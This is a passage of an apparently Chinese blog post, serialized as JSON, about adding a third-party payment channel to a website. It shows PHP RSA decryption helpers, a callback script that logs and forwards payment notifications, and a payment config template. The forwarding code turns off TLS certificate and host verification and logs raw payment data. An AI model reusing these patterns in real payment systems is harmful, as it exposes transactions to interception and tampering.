[description]</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span> [type]             [description]</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">privateKeyStr</span><span class=\"params\">($privatekey)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        $private_key = <span class=\"string\">\"-----BEGIN PRIVATE KEY-----\\r\\n\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">foreach</span> (str_split($privatekey,<span class=\"number\">64</span>) <span class=\"keyword\">as</span> $str)&#123;</span><br><span class=\"line\">            $private_key .= $str . <span class=\"string\">\"\\r\\n\"</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        $private_key .=<span class=\"string\">\"-----END PRIVATE KEY-----\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> $private_key;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * [decode 私钥解密]</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span>  [type] $data       [待解密字符串]</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span>  [type] $privateKey [私钥]</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span> [type]             [description]</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">privateDecrypt</span><span class=\"params\">($data,$privateKey)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//读取秘钥</span></span><br><span class=\"line\">        $pr_key = openssl_pkey_get_private($privateKey);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ($pr_key == <span class=\"keyword\">false</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">\"打开密钥出错\"</span>;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        $data = base64_decode($data);</span><br><span class=\"line\">        $crypto = <span class=\"string\">''</span>;</span><br><span class=\"line\">        <span class=\"comment\">//分段解密</span></span><br><span class=\"line\">        <span class=\"keyword\">foreach</span> (str_split($data, <span class=\"number\">128</span>) <span class=\"keyword\">as</span> $chunk) &#123;</span><br><span class=\"line\">            openssl_private_decrypt($chunk, $decryptData, $pr_key);</span><br><span class=\"line\">            $crypto .= $decryptData;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> $crypto;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>rechargeNotify回调核心代码</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * desc: 处理线上支付无参数路由支付回调处理方法：通过url调用执行该文件，获取相关支付确认信息后，通过curl转发到带参数路由的api接口</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\">define(<span class=\"string\">'S_ROOT'</span>, dirname(<span class=\"keyword\">__FILE__</span>) . DIRECTORY_SEPARATOR);</span><br><span class=\"line\"><span class=\"comment\">//require S_ROOT . 'core' . DIRECTORY_SEPARATOR . 'base.php';</span></span><br><span class=\"line\"></span><br><span class=\"line\">$data       = [];  <span class=\"comment\">//支付回调数据</span></span><br><span class=\"line\">$payData    = <span class=\"string\">''</span>;  <span class=\"comment\">//支付回传的支付参数，规定：使用\"_\"将支付名称与支付ID连接起来，如兄弟支付：'xiongdi_123'</span></span><br><span class=\"line\">$payType    = <span class=\"string\">''</span>;  <span class=\"comment\">//支付类型</span></span><br><span class=\"line\">$payment_id = <span class=\"string\">''</span>;  <span class=\"comment\">//支付方式ID</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//不同的支付方式获取数据的方式可能不同，根据不同的支付，添加不同的获取回调数据的方法，如：$_GET\\$_POST\\$_REQUEST\\（php://input）</span></span><br><span class=\"line\">$postData = file_get_contents(<span class=\"string\">\"php://input\"</span>);  <span class=\"comment\">//获取post参数字符串类型数据</span></span><br><span class=\"line\">payLog(<span class=\"string\">'callbackRecharge.txt'</span>,print_r($postData,<span class=\"keyword\">true</span>).<span class=\"string\">'---23---'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//数据处理，不同的支付方式，可能数据处理方式不同</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>  (!<span class=\"keyword\">empty</span>($postData)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!simplexml_load_string($postData, <span class=\"string\">'SimpleXMLElement'</span>, LIBXML_NOCDATA)) &#123;</span><br><span class=\"line\">       parse_str($postData, $data);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        $data = json_decode(json_encode(simplexml_load_string($postData, <span class=\"string\">'SimpleXMLElement'</span>, LIBXML_NOCDATA)), <span class=\"keyword\">true</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    payLog(<span class=\"string\">'callbackRecharge.txt'</span>,print_r($postData,<span class=\"keyword\">true</span>).<span class=\"string\">'---20---'</span> . print_r(simplexml_load_string($postData, <span class=\"string\">'SimpleXMLElement'</span>, LIBXML_NOCDATA),<span class=\"keyword\">true</span>));</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    $data = $_REQUEST;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">payLog(<span class=\"string\">'callbackRecharge.txt'</span>,print_r($data,<span class=\"keyword\">true</span>).<span class=\"string\">'---26---'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (!<span class=\"keyword\">empty</span>($data)) &#123;</span><br><span class=\"line\">    payLog(<span class=\"string\">'callbackRecharge.txt'</span>, <span class=\"string\">'异步充值接参数通知数据：'</span> . print_r($data, <span class=\"keyword\">true</span>));  <span class=\"comment\">//日志，记录转接数据</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($data[<span class=\"string\">'pay_attach'</span>])) &#123;</span><br><span class=\"line\">        $payData = explode(<span class=\"string\">'_'</span>, $data[<span class=\"string\">'pay_attach'</span>]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">empty</span>($payData)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">exit</span>(<span class=\"string\">'0'</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    $payType    = $payData[<span class=\"number\">0</span>] ?? <span class=\"string\">''</span>;</span><br><span class=\"line\">    $payment_id = $payData[<span class=\"number\">1</span>] ?? <span class=\"string\">''</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (!<span class=\"keyword\">empty</span>($data) &amp;&amp; !<span class=\"keyword\">empty</span>($payment_id)) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    payLog(<span class=\"string\">'curlRecharge.log'</span>, <span class=\"string\">'异步充值url转接参数通知数据：'</span> . print_r($data, <span class=\"keyword\">true</span>));  <span class=\"comment\">//日志，记录转接数据</span></span><br><span class=\"line\"></span><br><span class=\"line\">    $ret = httpPostApi($data, $payment_id);   <span class=\"comment\">//异步充值通知转接</span></span><br><span class=\"line\">    payLog(<span class=\"string\">'callbackRecharge.txt'</span>,print_r($ret,<span class=\"keyword\">true</span>).<span class=\"string\">'----73--'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">echo</span> $ret;  <span class=\"comment\">//输出结果数据</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 充值异步转接接口调用，post数据转发，表单提交数据库格式</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> array $payData  需要转发的数据</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> int $paymentId  线上支付方式ID</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@return</span> mixed|number   返回数据</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">httpPostApi</span><span class=\"params\">($payData, $paymentId)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//路由api接口</span></span><br><span class=\"line\">    $payUrl = <span class=\"string\">\"https://\"</span>.$_SERVER[<span class=\"string\">'HTTP_HOST'</span>].<span class=\"string\">\"/?m=api&amp;c=recharge&amp;a=rechargeNotify&amp;payment_id=\"</span> . $paymentId;</span><br><span class=\"line\"></span><br><span class=\"line\">    $ch = curl_init();</span><br><span class=\"line\">    curl_setopt($ch,CURLOPT_URL, $payUrl);</span><br><span class=\"line\">    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, <span class=\"keyword\">false</span>);</span><br><span class=\"line\">    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, <span class=\"keyword\">false</span>);</span><br><span class=\"line\">    curl_setopt($ch, CURLOPT_POST, <span class=\"keyword\">true</span>);</span><br><span class=\"line\">    curl_setopt($ch, CURLOPT_HEADER, <span class=\"keyword\">false</span>);</span><br><span class=\"line\">    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($payData));</span><br><span class=\"line\">    curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class=\"keyword\">true</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    $response=curl_exec($ch);</span><br><span class=\"line\">    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class=\"line\"></span><br><span class=\"line\">    curl_close($ch);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($httpCode == <span class=\"number\">200</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> $response;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 支付日志</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span>  string $fileName 文件名,如：payerror.log或者pay/error.log</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span>  array $data 数据</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">payLog</span><span class=\"params\">($fileName, $data)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    $pathLog = S_ROOT . <span class=\"string\">'caches'</span> . DIRECTORY_SEPARATOR . <span class=\"string\">'log'</span> . DIRECTORY_SEPARATOR . $fileName;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (is_file($pathLog)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (filesize($pathLog) &gt;= <span class=\"number\">10000000</span>) &#123;</span><br><span class=\"line\">            $new_file = dirname($pathLog) . <span class=\"string\">'/'</span> . date(<span class=\"string\">'Y_m_d_H_i_s'</span>).<span class=\"string\">'_'</span>  . basename($pathLog);</span><br><span class=\"line\">            copy($pathLog,$new_file);</span><br><span class=\"line\">            file_put_contents($pathLog, <span class=\"string\">'&lt;----'</span> . date(<span class=\"string\">'Y-m-d H:i:s'</span>).<span class=\"string\">'----&gt;'</span> . $data . <span class=\"string\">\"\\n\"</span>);</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            file_put_contents($pathLog, <span class=\"string\">'&lt;----'</span> . date(<span class=\"string\">'Y-m-d H:i:s'</span>).<span class=\"string\">'----&gt;'</span> . $data . <span class=\"string\">\"\\n\"</span>, FILE_APPEND);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        file_put_contents($pathLog, <span class=\"string\">'&lt;----'</span> . date(<span class=\"string\">'Y-m-d H:i:s'</span>).<span class=\"string\">'----&gt;'</span> . $data . <span class=\"string\">\"\\n\"</span>, FILE_APPEND);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>突然有一天老板扔给我一个错误百出的文档（文档不规范，码农两行泪），让我往某不知名网站添加某不可描述支付</p>","more":"<h3 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h3><ul>\n<li><p>登录后台发现有添加第三方支付的菜单，但是发现只能更改配置，无法添加新的支付方式（知道不会这么简单）</p>\n</li>\n<li><p>进入数据库发现数据存储在<code>payment_config</code>表中，试着直接数据库添加查看数据变化，添加后发现只能出现在支付列表中，无法添加和更改配置</p>\n</li>\n<li><p>查看页面请求，直接阅读获取支付代码，发现有一个<code>pay.json</code>的配置文件，直接打开，部分代码如下</p>\n</li>\n</ul>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"attr\">\"nid\"</span>: <span class=\"string\">\"nid_pay\"</span>,</span><br><span class=\"line\">        <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"请选择类型\"</span>,</span><br><span class=\"line\">        <span class=\"attr\">\"merchantID\"</span>: <span class=\"string\">\"支付平台提供给商家的账号\"</span>,</span><br><span class=\"line\">        <span class=\"attr\">\"terminalID\"</span>: <span class=\"string\">\"支付平台提供给商家的终端号\"</span>,</span><br><span class=\"line\">        <span class=\"attr\">\"merchantKey\"</span>: <span class=\"string\">\"支付平台提供个商家的密码（MD5加密时使用）\"</span>,</span><br><span class=\"line\">        <span class=\"attr\">\"merchantPayKey\"</span>: <span class=\"string\">\"支付有关的其他秘钥或信息\"</span>,</span><br><span class=\"line\">        <span class=\"attr\">\"partnerId\"</span>: <span class=\"string\">\"支付平台代理商账号\"</span>,</span><br><span class=\"line\">        <span class=\"attr\">\"merchantPrivateKey\"</span>: <span class=\"string\">\"用户私钥（与用户公钥成对存在）\"</span>,</span><br><span class=\"line\">        <span class=\"attr\">\"merchantPublicKey\"</span>: <span class=\"string\">\"用户公钥（与用户私钥成对存在）\"</span>,</span><br><span class=\"line\">        <span class=\"attr\">\"platformPublicKey\"</span>: <span class=\"string\">\"平台公钥（平台提供，一般在商户登录支付平台后台管理页面获取）\"</span>,</span><br><span class=\"line\">        <span class=\"attr\">\"merchantCertPath\"</span>: <span class=\"string\">\"商家证书\"</span>,</span><br><span class=\"line\">        <span class=\"attr\">\"platformCertPath\"</span>: <span class=\"string\">\"平台证书\"</span>,</span><br><span class=\"line\">        <span class=\"attr\">\"payBank\"</span>: [&#123;<span class=\"attr\">\"bank_id\"</span>:<span class=\"number\">1</span>,<span class=\"attr\">\"code\"</span>:<span class=\"string\">\"ICBC\"</span>&#125;,&#123;<span class=\"attr\">\"bank_id\"</span>:<span class=\"number\">2</span>,<span class=\"attr\">\"code\"</span>:<span class=\"string\">\"ABC\"</span>&#125;,&#123;<span class=\"attr\">\"bank_id\"</span>:<span class=\"number\">9</span>,<span class=\"attr\">\"code\"</span>:<span class=\"string\">\"BOC\"</span>&#125;,&#123;<span class=\"attr\">\"bank_id\"</span>:<span class=\"number\">7</span>,<span class=\"attr\">\"code\"</span>:<span class=\"string\">\"CCB\"</span>&#125;,</span><br><span class=\"line\">        \t\t\t&#123;<span class=\"attr\">\"bank_id\"</span>:<span class=\"number\">10</span>,<span class=\"attr\">\"code\"</span>:<span class=\"string\">\"COMM\"</span>&#125;,&#123;<span class=\"attr\">\"bank_id\"</span>:<span class=\"number\">11</span>,<span class=\"attr\">\"code\"</span>:<span class=\"string\">\"CMB\"</span>&#125;,&#123;<span class=\"attr\">\"bank_id\"</span>:<span class=\"number\">14</span>,<span class=\"attr\">\"code\"</span>:<span class=\"string\">\"SPDB\"</span>&#125;,&#123;<span class=\"attr\">\"bank_id\"</span>:<span class=\"number\">26</span>,<span class=\"attr\">\"code\"</span>:<span class=\"string\">\"CIB\"</span>&#125;,</span><br><span class=\"line\">        \t\t\t&#123;<span class=\"attr\">\"bank_id\"</span>:<span class=\"number\">15</span>,<span class=\"attr\">\"code\"</span>:<span class=\"string\">\"CMBC\"</span>&#125;,&#123;<span class=\"attr\">\"bank_id\"</span>:<span class=\"number\">13</span>,<span class=\"attr\">\"code\"</span>:<span class=\"string\">\"GDB\"</span>&#125;,&#123;<span class=\"attr\">\"bank_id\"</span>:<span class=\"number\">12</span>,<span class=\"attr\">\"code\"</span>:<span class=\"string\">\"SPDB\"</span>&#125;,&#123;<span class=\"attr\">\"bank_id\"</span>:<span class=\"number\">8</span>,<span class=\"attr\">\"code\"</span>:<span class=\"string\">\"CEB\"</span>&#125;,</span><br><span class=\"line\">        \t\t\t&#123;<span class=\"attr\">\"bank_id\"</span>:<span class=\"number\">29</span>,<span class=\"attr\">\"code\"</span>:<span class=\"string\">\"HXB\"</span>&#125;,&#123;<span class=\"attr\">\"bank_id\"</span>:<span class=\"number\">3</span>,<span class=\"attr\">\"code\"</span>:<span class=\"string\">\"PSBC\"</span>&#125;,&#123;<span class=\"attr\">\"bank_id\"</span>:<span class=\"number\">6</span>,<span class=\"attr\">\"code\"</span>:<span class=\"string\">\"PAB\"</span>&#125;</span><br><span class=\"line\">    \t\t\t],</span><br><span class=\"line\">        <span class=\"attr\">\"pay_layers\"</span>: <span class=\"string\">\"1,2,3,5,4,6,7,8,9,10,11\"</span>,</span><br><span class=\"line\">        <span class=\"attr\">\"payType\"</span>: [</span><br><span class=\"line\">\t        &#123;<span class=\"attr\">\"id\"</span>: <span class=\"number\">1</span>,<span class=\"attr\">\"name\"</span>:<span class=\"string\">\"微信扫码支付\"</span>,<span class=\"attr\">\"payStr\"</span>:<span class=\"string\">\"支付配置信息\"</span>,<span class=\"attr\">\"typeStr\"</span>:<span class=\"string\">\"其他支付配置信息\"</span>,<span class=\"attr\">\"payEntrance\"</span>:<span class=\"string\">\"端口类型：1=ios,2=android,3=h5,4=pc\"</span>,<span class=\"attr\">\"payStatus\"</span>:<span class=\"string\">\"是否启用：1:启用;2:禁用\"</span>,<span class=\"attr\">\"request_type\"</span>:<span class=\"string\">\"返回数据or跳转页面：1：返回数据，2:跳转页面\"</span>&#125;,</span><br><span class=\"line\">\t        &#123;<span class=\"attr\">\"id\"</span>: <span class=\"number\">2</span>,<span class=\"attr\">\"name\"</span>:<span class=\"string\">\"微信WAP支付\"</span>,<span class=\"attr\">\"payStr\"</span>:<span class=\"string\">\"WX_WAP\"</span>,<span class=\"attr\">\"typeStr\"</span>:<span class=\"string\">\"\"</span>,<span class=\"attr\">\"payEntrance\"</span>:<span class=\"string\">\"1,2,3,4\"</span>,<span class=\"attr\">\"payStatus\"</span>:<span class=\"number\">1</span>,<span class=\"attr\">\"request_type\"</span>:<span class=\"number\">2</span>&#125;,</span><br><span class=\"line\">\t        &#123;<span class=\"attr\">\"id\"</span>: <span class=\"number\">3</span>,<span class=\"attr\">\"name\"</span>:<span class=\"string\">\"微信H5支付\"</span>,<span class=\"attr\">\"payStr\"</span>:<span class=\"string\">\"WX_H5\"</span>,<span class=\"attr\">\"typeStr\"</span>:<span class=\"string\">\"\"</span>,<span class=\"attr\">\"payEntrance\"</span>:<span class=\"string\">\"1,2,3,4\"</span>,<span class=\"attr\">\"payStatus\"</span>:<span class=\"number\">1</span>,<span class=\"attr\">\"request_type\"</span>:<span class=\"number\">2</span>&#125;,</span><br><span class=\"line\">\t        &#123;<span class=\"attr\">\"id\"</span>: <span class=\"number\">4</span>,<span class=\"attr\">\"name\"</span>:<span class=\"string\">\"支付宝扫码支付\"</span>,<span class=\"attr\">\"payStr\"</span>:<span class=\"string\">\"ALI\"</span>,<span class=\"attr\">\"typeStr\"</span>:<span class=\"string\">\"\"</span>,<span class=\"attr\">\"payEntrance\"</span>:<span class=\"string\">\"1,2,3,4\"</span>,<span class=\"attr\">\"payStatus\"</span>:<span class=\"number\">1</span>,<span class=\"attr\">\"request_type\"</span>:<span class=\"number\">1</span>&#125;,</span><br><span class=\"line\">\t        &#123;<span class=\"attr\">\"id\"</span>: <span class=\"number\">5</span>,<span class=\"attr\">\"name\"</span>:<span class=\"string\">\"支付宝WAP支付\"</span>,<span class=\"attr\">\"payStr\"</span>:<span class=\"string\">\"ALI_WAP\"</span>,<span class=\"attr\">\"typeStr\"</span>:<span class=\"string\">\"\"</span>,<span class=\"attr\">\"payEntrance\"</span>:<span class=\"string\">\"1,2,3,4\"</span>,<span class=\"attr\">\"payStatus\"</span>:<span class=\"number\">1</span>,<span class=\"attr\">\"request_type\"</span>:<span class=\"number\">2</span>&#125;,</span><br><span class=\"line\">\t        &#123;<span class=\"attr\">\"id\"</span>: <span class=\"number\">6</span>,<span class=\"attr\">\"name\"</span>:<span class=\"string\">\"支付宝H5支付\"</span>,<span class=\"attr\">\"payStr\"</span>:<span class=\"string\">\"ALI_H5\"</span>,<span class=\"attr\">\"typeStr\"</span>:<span class=\"string\">\"\"</span>,<span class=\"attr\">\"payEntrance\"</span>:<span class=\"string\">\"1,2,3,4\"</span>,<span class=\"attr\">\"payStatus\"</span>:<span class=\"number\">1</span>,<span class=\"attr\">\"request_type\"</span>:<span class=\"number\">2</span>&#125;,</span><br><span class=\"line\">\t        &#123;<span class=\"attr\">\"id\"</span>: <span class=\"number\">7</span>,<span class=\"attr\">\"name\"</span>:<span class=\"string\">\"QQ钱包扫码支付\"</span>,<span class=\"attr\">\"payStr\"</span>:<span class=\"string\">\"QQ\"</span>,<span class=\"attr\">\"typeStr\"</span>:<span class=\"string\">\"\"</span>,<span class=\"attr\">\"payEntrance\"</span>:<span class=\"string\">\"1,2,3,4\"</span>,<span class=\"attr\">\"payStatus\"</span>:<span class=\"number\">1</span>,<span class=\"attr\">\"request_type\"</span>:<span class=\"number\">1</span>&#125;,</span><br><span class=\"line\">\t        &#123;<span class=\"attr\">\"id\"</span>: <span class=\"number\">8</span>,<span class=\"attr\">\"name\"</span>:<span class=\"string\">\"QQ钱包WAP支付\"</span>,<span class=\"attr\">\"payStr\"</span>:<span class=\"string\">\"QQ_WAP\"</span>,<span class=\"attr\">\"typeStr\"</span>:<span class=\"string\">\"\"</span>,<span class=\"attr\">\"payEntrance\"</span>:<span class=\"string\">\"1,2,3,4\"</span>,<span class=\"attr\">\"payStatus\"</span>:<span class=\"number\">1</span>,<span class=\"attr\">\"request_type\"</span>:<span class=\"number\">2</span>&#125;,</span><br><span class=\"line\">\t        &#123;<span class=\"attr\">\"id\"</span>: <span class=\"number\">9</span>,<span class=\"attr\">\"name\"</span>:<span class=\"string\">\"QQ钱包H5支付\"</span>,<span class=\"attr\">\"payStr\"</span>:<span class=\"string\">\"QQ_H5\"</span>,<span class=\"attr\">\"typeStr\"</span>:<span class=\"string\">\"\"</span>,<span class=\"attr\">\"payEntrance\"</span>:<span class=\"string\">\"1,2,3,4\"</span>,<span class=\"attr\">\"payStatus\"</span>:<span class=\"number\">1</span>,<span class=\"attr\">\"request_type\"</span>:<span class=\"number\">2</span>&#125;,</span><br><span class=\"line\">\t        &#123;<span class=\"attr\">\"id\"</span>: <span class=\"number\">10</span>,<span class=\"attr\">\"name\"</span>:<span class=\"string\">\"网银支付\"</span>,<span class=\"attr\">\"payStr\"</span>:<span class=\"string\">\"WY\"</span>,<span class=\"attr\">\"typeStr\"</span>:<span class=\"string\">\"\"</span>,<span class=\"attr\">\"payEntrance\"</span>:<span class=\"string\">\"1,2,3,4\"</span>,<span class=\"attr\">\"payStatus\"</span>:<span class=\"number\">1</span>,<span class=\"attr\">\"request_type\"</span>:<span class=\"number\">2</span>&#125;,</span><br><span class=\"line\">\t        &#123;<span class=\"attr\">\"id\"</span>: <span class=\"number\">11</span>,<span class=\"attr\">\"name\"</span>:<span 